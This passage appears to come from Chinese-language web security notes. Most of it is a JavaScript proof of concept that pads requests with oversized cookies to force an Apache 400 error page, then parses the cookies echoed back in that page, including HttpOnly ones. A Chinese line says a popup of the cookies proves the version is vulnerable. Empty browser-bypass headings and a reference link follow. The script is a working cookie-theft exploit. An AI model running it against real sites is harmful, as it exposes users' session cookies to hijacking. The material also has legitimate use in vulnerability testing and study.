		        if (xhr.readyState === 4 && xhr.status === 400) {  
		            // Replace newlines and match <pre> content  
		            var content = xhr.responseText.replace(/\r|\n/g,'').match(/<pre>(.+)<\/pre>/);  
		            if (content.length) {  
		                // Remove Cookie: prefix  
		                content = content[1].replace("Cookie: ", "");  
		                var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/g);  
		                // Add cookies to object  
		                for (var i=0; i<cookies.length; i++) {  
		                    var s_c = cookies[i].split('=',2);  
		                    cookie_dict[s_c[0]] = s_c[1];  
		                }  
		            }  
		            // Unset malicious cookies  
		            setCookies(true);  
		            alert(JSON.stringify(cookie_dict));  
		        }  
		    }  
		    // Make XHR request  
		    var xhr = new XMLHttpRequest();  
		    xhr.onreadystatechange = parseCookies;  
		    xhr.open("GET", "/", true);  
		    xhr.send(null);  
		}  
		makeRequest();

	在存在漏洞Apache版本中运行，如果弹出来cookie就证明有漏洞。

#浏览器bypass
---
##IE
##chrome
##firefox
##safari

#参考链接
<http://www.myhack58.com/Article/html/3/7/2014/42356_2.htm>